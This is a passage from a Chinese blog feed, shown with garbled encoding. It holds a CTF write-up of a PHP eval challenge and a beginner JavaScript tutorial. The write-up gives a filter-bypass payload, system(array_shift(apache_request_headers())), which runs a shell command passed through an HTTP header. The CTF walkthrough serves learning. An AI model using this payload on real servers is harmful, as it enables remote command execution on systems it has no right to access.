title="ctfé¢˜ç›®è®²è§£"></a>ctfé¢˜ç›®è®²è§£</h1><h2 id="NoRce"><a href="#NoRce" class="headerlink" title="NoRce"></a>NoRce</h2><p>æºç ï¼š</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);$exp = $_GET[&#39;exp&#39;];//php7.3 + Apacheif(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)) &#123;    if(!preg_match(&quot;/o|v|b|print|var|time|file|sqrt|path|dir|exp|pi|an|na|en|ex|et|na|dec|true|false|[0-9]/i&quot;, $exp))&#123;        eval($exp);    &#125;else&#123;        exit(&#39;NoNoNo,U R Hacker~&#39;);    &#125;&#125;else&#123;    exit(&quot;What&#39;s this?&quot;);&#125;?&gt;</code></pre><p>è¿‡æ»¤ç›¸å½“ä¸¥æ ¼</p><p>æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°</p><pre><code>apache_request_headers();</code></pre><p>æ²¡æœ‰è¢«è¿‡æ»¤</p><p>æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨å…¶å®ƒå‡ ä¸ªæ²¡æœ‰è¢«è¿‡æ»¤çš„å‡½æ•°æ„é€ payload</p><pre><code>die() å‡½æ•°è¾“å‡ºä¸€æ¡æ¶ˆæ¯ï¼Œå¹¶é€€å‡ºå½“å‰è„šæœ¬array_shift() - åˆ é™¤æ•°ç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¢«åˆ é™¤å…ƒç´ çš„å€¼</code></pre><p>åœ¨æˆ‘çš„ç”µè„‘ä¸­ï¼Œéœ€è¦æŠŠflagå¤´ï¼Œæ”¾åœ¨hostå‰ï¼Œå…·ä½“åŸå› æœªçŸ¥</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411013150830.png" alt="image-20220411013150830"></p><p>æ­¤æ—¶arry_shift()è¿”å›çš„å€¼å°±æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤</p><p>payload</p><pre><code>?exp=system(array_shift(apache_request_headers()));# postflag: whoami</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411013259840.png" alt="image-20220411013259840"></p><p>æˆåŠŸæ‰§è¡Œå‘½ä»¤</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…å­¦javascript</title>
      <link href="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/"/>
      <url>/2022/04/07/%E6%B5%85%E5%AD%A6javascript/</url>
      
        <content type="html"><![CDATA[<p>è¯¥æ¥çš„æ°¸è¿œè·‘ä¸æ‰ï¼Œè¯¥è¡¥çš„æ—©æ™šè¦è¡¥ï¼Œè¯¶ï¼Œå¥½å¥½å­¦javascriptï¼Œæˆ‘çˆ±å­¦ä¹ ï¼ï¼ï¼ï¼ï¼</p><p>[TOC]</p><h1 id="å†å²"><a href="#å†å²" class="headerlink" title="å†å²"></a>å†å²</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407213804320.png" alt="image-20220407213804320"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407213723069.png" alt="image-20220407213723069"></p><h1 id="javascriptçš„ç»„æˆéƒ¨åˆ†"><a href="#javascriptçš„ç»„æˆéƒ¨åˆ†" class="headerlink" title="javascriptçš„ç»„æˆéƒ¨åˆ†"></a>javascriptçš„ç»„æˆéƒ¨åˆ†</h1><p>htmlæ˜¯éª¨æ¶ï¼Œcssæ˜¯å¯¹é¡µé¢è¿›è¡Œæ¸²æŸ“ï¼Œjsç»å¯¹è¿™ä¸ªé¡µé¢å¯ä»¥åšä»€ä¹ˆ</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407213908008.png" alt="image-20220407213908008"></p><p>javascriptç”±BOM,DMO,ECMAScriptç»„æˆ </p><p><strong>BOM</strong></p><p>å…¨å-Browser Object Model,æŒ‡çš„æ˜¯jsæ“ä½œæµè§ˆå™¨å‘é€å˜åŒ–çš„å±æ€§å’Œæ–¹æ³•</p><p><strong>DOM</strong></p><p>å…¨å-Document Object Model,æŒ‡çš„æ˜¯æ“ä½œæ–‡æ¡£æµå‘ç”Ÿå˜åŒ–çš„å±æ€§å’Œæ–¹æ³•</p><p><strong>ECMAScript</strong></p><p>æŒ‡çš„æ˜¯JSä»£ç çš„ä¹¦å†™è¯­æ³•å’Œä¹¦å†™è§„åˆ™</p><h1 id="JavaScript-ä¹¦å†™ä½ç½®"><a href="#JavaScript-ä¹¦å†™ä½ç½®" class="headerlink" title="JavaScript ä¹¦å†™ä½ç½®"></a>JavaScript ä¹¦å†™ä½ç½®</h1><p><strong>è¡Œå†…å¼</strong></p><p>aæ ‡ç­¾-ä¹¦å†™åœ¨hrefå±æ€§ä¸Š</p><pre><code class="javascript">&lt;a href=&quot;javascript: JSä»£ç ;&quot;&gt;ç‚¹æˆ‘ä¸€ä¸‹&lt;/a&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407215348244.png" alt="image-20220407215348244"></p><p>éaæ ‡ç­¾-ä¹¦å†™åœ¨è¡Œä¸ºå±æ€§ä¸Š</p><pre><code class="javascript">&lt;div onclick=&quot;alert(&#39;hello word&#39;)&quot;&gt;ç‚¹æˆ‘ä¸€ä¸‹&lt;/div&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407215601888.png" alt="image-20220407215601888"></p><p><strong>å†…åµŒå¼</strong></p><p>æŠŠä»£ç ä¹¦å†™åœ¨ä¸€ä¸ªscriptæ ‡ç­¾å¯¹é‡Œé¢,ä¸éœ€è¦ä¾èµ–ä»»ä½•è¡Œä¸ºï¼Œæ‰“å¼€ç½‘é¡µå°±ä¼šæ‰§è¡Œ</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407215824582.png" alt="image-20220407215824582"></p><p><strong>å¤–é“¾å¼</strong></p><p>æŠŠä»£ç ä¹¦å†™åœ¨ä¸€ä¸ª.jsæ–‡ä»¶å†…ï¼Œå¤–é“¾å¼jsä»£ç ï¼Œä¸éœ€è¦ä¾èµ–ä»»ä½•è¡Œä¸ºï¼Œæ‰“å¼€é¡µé¢å°±ä¼šæ‰§è¡Œ</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407220351326.png" alt="image-20220407220351326"></p><h1 id="JavaScriptå®šä¹‰å˜é‡"><a href="#JavaScriptå®šä¹‰å˜é‡" class="headerlink" title="JavaScriptå®šä¹‰å˜é‡"></a>JavaScriptå®šä¹‰å˜é‡</h1><pre><code class="javascript">var num = 100</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407220943173.png" alt="image-20220407220943173"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407220903524.png" alt="image-20220407220903524"></p><h1 id="ä¸‰ç§è¾“å‡ºæ–¹å¼"><a href="#ä¸‰ç§è¾“å‡ºæ–¹å¼" class="headerlink" title="ä¸‰ç§è¾“å‡ºæ–¹å¼"></a>ä¸‰ç§è¾“å‡ºæ–¹å¼</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221044266.png" alt="image-20220407221044266"></p><h1 id="JSçš„æ•°æ®ç±»å‹"><a href="#JSçš„æ•°æ®ç±»å‹" class="headerlink" title="JSçš„æ•°æ®ç±»å‹"></a>JSçš„æ•°æ®ç±»å‹</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221242187.png" alt="image-20220407221242187"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221932277.png" alt="image-20220407221932277"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221440539.png" alt="image-20220407221440539"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221511452.png" alt="image-20220407221511452"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221817260.png" alt="image-20220407221817260"></p><h1 id="JavaScriptæ•°æ®ç±»å‹è½¬æ¢"><a href="#JavaScriptæ•°æ®ç±»å‹è½¬æ¢" class="headerlink" title="JavaScriptæ•°æ®ç±»å‹è½¬æ¢"></a>JavaScriptæ•°æ®ç±»å‹è½¬æ¢</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222131138.png" alt="image-20220407222131138"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222415779.png" alt="image-20220407222415779"></p><p>å½“å¯ä»¥åˆæ³•è½¬æ¢å°±æ­£å¸¸è½¬æ¢ï¼Œå½“æ— æ³•åˆæ³•è½¬æ¢æ—¶ï¼Œå€¼å°±å˜ä¸ºNAN</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407230433762.png" alt="image-20220407230433762"></p><p>å½“å¯ä»¥åˆæ³•è½¬æ¢å°±æ­£å¸¸è½¬æ¢ï¼Œå½“æ— æ³•åˆæ³•è½¬æ¢æ—¶ï¼Œå¦‚æœåŸå€¼ä»¥å­—æ¯ï¼Œåˆ™è¿”å›å€¼ä¸ºNANï¼Œå¦‚æœåŸå€¼ä»¥æ•°å­—+å­—ç¬¦ä¸²å¼€å¤´ï¼Œåˆ™è¿”å›å‰é¢çš„æ•°å­—è€Œå¿½ç•¥å­—ç¬¦ä¸²</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222543001.png" alt="image-20220407222543001"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222630874.png" alt="image-20220407222630874"></p><h1 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407230952623.png" alt="image-20220407230952623"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231034790.png" alt="image-20220407231034790"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231109372.png" alt="image-20220407231109372"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231129915.png" alt="image-20220407231129915"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231232353.png" alt="image-20220407231232353"></p><h1 id="æ¡ä»¶åˆ†æ”¯è¯­å¥"><a href="#æ¡ä»¶åˆ†æ”¯è¯­å¥" class="headerlink" title="æ¡ä»¶åˆ†æ”¯è¯­å¥"></a>æ¡ä»¶åˆ†æ”¯è¯­å¥</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231403054.png" alt="image-20220407231403054"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231436373.png" alt="image-20220407231436373"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231551013.png" alt="image-20220407231551013"></p><h1 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232532028.png" alt="image-20220407232532028"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232436701.png" alt="image-20220407232436701"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232646209.png" alt="image-20220407232646209"></p><h1 id="é€’å½’å‡½æ•°"><a href="#é€’å½’å‡½æ•°" class="headerlink" title="é€’å½’å‡½æ•°"></a>é€’å½’å‡½æ•°</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232807115.png" alt="image-20220407232807115"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232828922.png" alt="image-20220407232828922"></p><h1 id="ä½œç”¨åŸŸ"><a href="#ä½œç”¨åŸŸ" class="headerlink" title="ä½œç”¨åŸŸ"></a>ä½œç”¨åŸŸ</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232920259.png" alt="image-20220407232920259"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233013700.png" alt="image-20220407233013700"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233022496.png" alt="image-20220407233022496"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233059818.png" alt="image-20220407233059818"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233136738.png" alt="image-20220407233136738"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233201625.png" alt="image-20220407233201625"></p><h1 id="å¯¹è±¡æ•°æ®ç±»å‹"><a href="#å¯¹è±¡æ•°æ®ç±»å‹" class="headerlink" title="å¯¹è±¡æ•°æ®ç±»å‹"></a>å¯¹è±¡æ•°æ®ç±»å‹</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233307155.png" alt="image-20220407233307155"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233549115.png" alt="image-20220407233549115"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233644769.png" alt="image-20220407233644769"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233455066.png" alt="image-20220407233455066"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233504184.png" alt="image-20220407233504184"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233523944.png" alt="image-20220407233523944"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233615368.png" alt="image-20220407233615368"></p><h1 id="æ•°ç»„æ•°æ®ç±»å‹"><a href="#æ•°ç»„æ•°æ®ç±»å‹" class="headerlink" title="æ•°ç»„æ•°æ®ç±»å‹"></a>æ•°ç»„æ•°æ®ç±»å‹</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233743737.png" alt="image-20220407233743737"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233840225.png" alt="image-20220407233840225"></p><h1 id="æ•°ç»„å¸¸ç”¨æ–¹æ³•"><a href="#æ•°ç»„å¸¸ç”¨æ–¹æ³•" class="headerlink" title="æ•°ç»„å¸¸ç”¨æ–¹æ³•"></a>æ•°ç»„å¸¸ç”¨æ–¹æ³•</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000927943.png" alt="image-20220408000927943"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234008850.png" alt="image-20220407234008850"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234023183.png" alt="image-20220407234023183"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234038569.png" alt="image-20220407234038569"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234054841.png" alt="image-20220407234054841"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234110601.png" alt="image-20220407234110601"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234132600.png" alt="image-20220407234132600"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234420968.png" alt="image-20220407234420968"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234514112.png" alt="image-20220407234514112"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234540680.png" alt="image-20220407234540680"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234754392.png" alt="image-20220407234754392"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234822279.png" alt="image-20220407234822279"></p><p>åŒ…å‰ä¸åŒ…å</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000322543.png" alt="image-20220408000322543"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000514401.png" alt="image-20220408000514401"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000635298.png" alt="image-20220408000635298"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000653869.png" alt="image-20220408000653869"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000714136.png" alt="image-20220408000714136"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000753278.png" alt="image-20220408000753278"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000801246.png" alt="image-20220408000801246"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001013869.png" alt="image-20220408001013869"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001035076.png" alt="image-20220408001035076"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000830365.png" alt="image-20220408000830365"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000847454.png" alt="image-20220408000847454"></p><h1 id="å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•"><a href="#å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•" class="headerlink" title="å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•"></a>å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001751547.png" alt="image-20220408001751547"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001220640.png" alt="image-20220408001220640"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001232044.png" alt="image-20220408001232044"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001300510.png" alt="image-20220408001300510"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001325030.png" alt="image-20220408001325030"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001357820.png" alt="image-20220408001357820"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001425680.png" alt="image-20220408001425680"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001432558.png" alt="image-20220408001432558"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001456688.png" alt="image-20220408001456688"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001513319.png" alt="image-20220408001513319"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001558293.png" alt="image-20220408001558293"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001728712.png" alt="image-20220408001728712"></p><h1 id="æ•°å­—å¸¸ç”¨æ–¹æ³•"><a href="#æ•°å­—å¸¸ç”¨æ–¹æ³•" class="headerlink" title="æ•°å­—å¸¸ç”¨æ–¹æ³•"></a>æ•°å­—å¸¸ç”¨æ–¹æ³•</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002711294.png" alt="image-20220408002711294"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001857190.png" alt="image-20220408001857190"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001921068.png" alt="image-20220408001921068"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001959789.png" alt="image-20220408001959789"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002017326.png" alt="image-20220408002017326"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002033918.png" alt="image-20220408002033918"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002053540.png" alt="image-20220408002053540"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002112036.png" alt="image-20220408002112036"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002122229.png" alt="image-20220408002122229"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002133196.png" alt="image-20220408002133196"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002147147.png" alt="image-20220408002147147"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002152859.png" alt="image-20220408002152859"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002208364.png" alt="image-20220408002208364"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002217762.png" alt="image-20220408002217762"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002233052.png" alt="image-20220408002233052"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002257196.png" alt="image-20220408002257196"></p><h1 id="æ—¶é—´å¸¸ç”¨æ–¹æ³•"><a href="#æ—¶é—´å¸¸ç”¨æ–¹æ³•" class="headerlink" title="æ—¶é—´å¸¸ç”¨æ–¹æ³•"></a>æ—¶é—´å¸¸ç”¨æ–¹æ³•</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002836962.png" alt="image-20220408002836962"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002855807.png" alt="image-20220408002855807"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408003002403.png" alt="image-20220408003002403"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408003019626.png" alt="image-20220408003019626"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408003107445.png" alt="image-20220408003107445"></p><h1 id="JavaScriptçš„BOMæ“ä½œ"><a href="#JavaScriptçš„BOMæ“ä½œ" class="headerlink" title="JavaScriptçš„BOMæ“ä½œ"></a>JavaScriptçš„BOMæ“ä½œ</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410161902503.png" alt="image-20220410161902503"></p><p><strong>1ã€è·å–æµè§ˆå™¨çª—å£å°ºå¯¸</strong></p><pre><code>è·å–å¯è§†çª—å£å®½åº¦: window.innerWidthè·å–å¯è§†çª—å£é«˜åº¦: window.innerHeight</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410162216868.png" alt="image-20220410162216868"></p><p><strong>2ã€æµè§ˆå™¨çš„å¼¹å‡ºå±‚</strong></p><pre><code>æç¤ºæ¡†: window.alert(&#39;æç¤ºä¿¡æ¯&#39;)è¯¢é—®æ¡†: window.confirm(&#39;æç¤ºä¿¡æ¯&#39;) è¿”å› trueå’Œfalseè¾“å…¥æ¡†: window.prompt(&#39;æç¤ºä¿¡æ¯&#39;) ç‚¹ç¡®å®šï¼Œè¿”å›è¾“å…¥æ¡†ä¸­å†…å®¹ï¼Œç‚¹å–æ¶ˆè¿”å›null</code></pre><p><strong>3ã€å¼€å¯å’Œå…³é—­æ ‡ç­¾é¡µ</strong></p><pre><code>å¼€å¯: window.open(&#39;åœ°å€&#39;)å…³é—­: window.close()</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410162721520.png" alt="image-20220410162721520"></p><p><strong>4ã€æµè§ˆå™¨å¸¸è§äº‹ä»¶</strong></p><pre><code>èµ„æºåŠ è½½å®Œæ¯•: window.onload = function() &#123;&#125;å¯è§†å°ºå¯¸æ”¹å˜: window.onresize = function()&#123;&#125;æ»šåŠ¨æ¡ä½ç½®æ”¹å˜: window.onscroll = function()&#123;&#125;</code></pre><ol><li>åœ¨é¡µé¢èµ„æºåŠ è½½å®Œæ¯•æ‰§è¡Œ</li></ol><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163103734.png" alt="image-20220410163103734"></p><ol start="2"><li><p>å¯è§†çª—å£å‘ç”Ÿå˜åŒ–æ—¶æ‰§è¡Œ</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163226827.png" alt="image-20220410163226827"></p></li><li><p>æ»šåŠ¨æ¡ä½ç½®æ”¹å˜æ—¶æ‰§è¡Œ</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163327867.png" alt="image-20220410163327867"></p></li></ol><p><strong>5ã€æµè§ˆå™¨å†å²è®°å½•æ“ä½œ</strong></p><pre><code>å›é€€é¡µé¢:window.history.back()å‰è¿›é¡µé¢: window.history.forward</code></pre><p><strong>6ã€æµè§ˆå™¨å·å»å°ºå¯¸</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163708715.png" alt="image-20220410163708715"></p><ol><li><p>å·å»çš„é«˜åº¦</p><pre><code>document.documentElement.scrollTop #å½“æœ‰&lt;!DOCTYPE html&gt;ç”¨è¿™ä¸ªdocument.body.scrollTop #å½“æ²¡æœ‰&lt;!DOCTYPE html&gt;ç”¨è¿™ä¸ª</code></pre><p>å…¼å®¹å†™æ³•</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164045152.png" alt="image-20220410164045152"></p></li><li><p>å·å»å®½åº¦</p><pre><code>document.documentElement.scrollleft #å½“æœ‰&lt;!DOCTYPE html&gt;ç”¨è¿™ä¸ªdocument.body.scrollleft #å½“æ²¡æœ‰&lt;!DOCTYPE html&gt;ç”¨è¿™ä¸ª</code></pre><p>å…¼å®¹å†™æ³•:</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164228039.png" alt="image-20220410164228039"></p></li></ol><p><strong>7ã€æµè§ˆå™¨æ»šåŠ¨åˆ°</strong></p><pre><code>window.scrolloTo()  #æ»šåŠ¨åˆ°å‚æ•°æ–¹å¼1(ç¬é—´å®šä½): window.scrollTo(left,top)        left:æµè§ˆå™¨å·å»é«˜åº¦        top:æµè§ˆå™¨å·å»é«˜åº¦å‚æ•°æ–¹å¼2(æ»šåŠ¨å®šä½): window.scrollTo(&#123;        left: xx        top: yy        behavior:&#39;smooth&#39;  #è¡¨ç¤ºå¹³æ»‘æ»šåŠ¨&#125;)</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164500900.png" alt="image-20220410164500900"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164841389.png" alt="image-20220410164841389"></p><h1 id="JavaScriptå®šæ—¶å™¨"><a href="#JavaScriptå®šæ—¶å™¨" class="headerlink" title="JavaScriptå®šæ—¶å™¨"></a>JavaScriptå®šæ—¶å™¨</h1><p><strong>é—´éš”å®šæ—¶å™¨</strong></p><pre><code>æŒ‰ç…§æŒ‡å®šå‘¨æœŸ(æ¯«ç§’)å»æ‰§è¡ŒæŒ‡å®šçš„ä»£ç è¯­æ³•: setInterval(å‡½æ•°,æ—¶é—´)å‡½æ•°: æ¯æ¬¡è¦æ‰§è¡Œçš„å†…å®¹æ—¶é—´: å•ä½æ˜¯æ¯«ç§’</code></pre><p>ç¤ºä¾‹ä»£ç </p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;sakura&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            setInterval(function()&#123;                console.log(&#39;æ‰§è¡Œä¸€æ¬¡&#39;)            &#125;,1000)  # å•ä½æ¯«ç§’ï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯1ç§’        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411122709604.png" alt="image-20220411122709604"></p><p>å»¶æ—¶å®šæ—¶å™¨</p><pre><code>åœ¨å›ºå®šçš„æ—¶é—´(æ¯«ç§’)åæŒ‡å®šä¸€æ¬¡ä»£ç è¯­æ³•: setTimeout(å‡½æ•°,æ—¶é—´)å‡½æ•°: æ—¶é—´åˆ°è¾¾æ‰§è¡Œçš„å†…å®¹æ—¶é—´: å•ä½æ˜¯æ¯«ç§’</code></pre><p>ç¤ºä¾‹ä»£ç </p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;sakura&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            setTimeout(function()&#123;                console.log(&#39;æ‰§è¡Œä¸€æ¬¡&#39;)            &#125;,1000)        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411122948862.png" 